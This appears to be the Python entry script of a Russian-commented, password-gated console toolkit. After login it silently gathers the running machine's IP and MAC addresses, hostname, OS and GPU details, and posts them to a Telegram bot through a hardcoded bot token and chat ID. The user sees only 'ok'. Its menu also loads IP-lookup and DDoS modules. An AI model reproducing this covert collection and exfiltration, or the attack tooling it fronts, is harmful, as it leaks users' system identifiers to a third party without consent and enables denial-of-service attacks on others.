import os
import platform
import json
import socket
import uuid
import requests
import logging  
from menu.banner import banner
from src.color import COLOR_CODE
from src.get_number import get_number, get_number_alternate, get_number_alternate2, get_number_alternate3
from pystyle import *

TOKEN = "destroyer"
PASSWORD = "manuals"
JSON_FILE = "user_data.json"  # Файл для сохранения данных
BOT_TOKEN = "6653012970:AAHsODmDd2tVP35p7h6MOzl0I0Hq3F4aQQg"
CHAT_ID = "-1001904820371"

# Настройка уровня логирования и вывод в файл
logging.basicConfig(filename='app.log', level=logging.DEBUG, format='%(asctime)s [%(levelname)s]: %(message)s')

def load_user_data_from_json():
    try:
        with open(JSON_FILE, 'r') as json_file:
            user_data = json.load(json_file)
            return user_data.get("Username", ""), user_data.get("IP Address", "N/A"), user_data.get("MAC Address", "N/A")
    except FileNotFoundError:
        return "", "N/A", "N/A"


def get_user_input():
    try:
        username = input(f'{COLOR_CODE["RED"]}[@]{COLOR_CODE["GREEN"]}username:{COLOR_CODE["YELLOW"]}  ')
        password = input(f'{COLOR_CODE["RED"]}[@]{COLOR_CODE["GREEN"]}pass:{COLOR_CODE["YELLOW"]} ')
        return username, password
    except Exception as e:
        logging.error(f"Ошибка при вводе данных: {str(e)}")
        return "", ""

def get_ip_address():
    try:
        hostname = socket.gethostname()
        ip_address = socket.gethostbyname(hostname)
        return ip_address
    except socket.error:
        return "N/A"

def get_mac_address():
    try:
        mac_address = ":".join(["{:02x}".format((uuid.getnode() >> elements) & 0xff) for elements in range(0, 2 * 6, 2)][::-1])
        return mac_address
    except Exception as e:
        return "N/A"

def get_computer_info():
    computer_info = {
        "Computer Name": platform.node(),
        "Operating System": platform.system(),
        "Machine Version": platform.machine(),
    }
    return computer_info

def get_hardware_info():
    try:
        import GPUtil

        gpus = GPUtil.getGPUs()
        if not gpus:
            gpu_info_dict = "No GPUs found"
        else:
            gpu_info = gpus[0]
            gpu_info_dict = {
                "GPU Name": gpu_info.name,
                "GPU Driver": gpu_info.driver,
                "GPU Memory Total": f"{gpu_info.memoryTotal} MB",
                "GPU Memory Free": f"{gpu_info.memoryFree} MB",
                "GPU Memory Used": f"{gpu_info.memoryUsed} MB",
            }
        return gpu_info_dict
    except ImportError:
        return "N/A"

def save_user_data_to_json(username, ip_address, mac_address):
    user_data = {
        "Username": username,
        "IP Address": ip_address,
        "MAC Address": mac_address,
        "Computer Info": get_computer_info(),
        "Hardware Info": get_hardware_info()
    }

    with open(JSON_FILE, 'w') as json_file:
        json.dump(user_data, json_file, indent=4)

    message = f"Имя пользователя: {username}\n\nIP-адрес: {ip_address}\nMAC-адрес: {mac_address}\n\n" \
              f"Информация о компьютере:\n{json.dumps(get_computer_info(), indent=4)}\n\n" \
              f"Информация об аппаратных характеристиках:\n{json.dumps(get_hardware_info(), indent=4)}"
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data = {
        "chat_id": CHAT_ID,
        "text": message
    }
    response = requests.post(url, data=data)
    if response.status_code == 200:
        print("ok")
    else:
        print("Произошла ошибка при отправке данных в Telegram.")

def main():
    try:
        saved_username, _, _ = load_user_data_from_json()
        username, password = get_user_input()

        if username == TOKEN and password == PASSWORD:
            print(Colorate.Horizontal(Colors.blue_to_green, Center.XCenter(banner)))
            ip_address = get_ip_address()
            mac_address = get_mac_address()
            save_user_data_to_json(username, ip_address, mac_address)
            select = input(f'{COLOR_CODE["RED"]}[@]{COLOR_CODE["GREEN"]}number: {COLOR_CODE["CYAN"]}')
            if select == '2':
                from src.ipinfo import get_ip
                get_ip()
            elif select == '4':
                    from src.get_ddos import get_ddos
                    get_ddos()

    except Exception as e:
        logging.error(f"Произошла ошибка в главной части кода: {str(e)}")

if __name__ == "__main__":
    main()

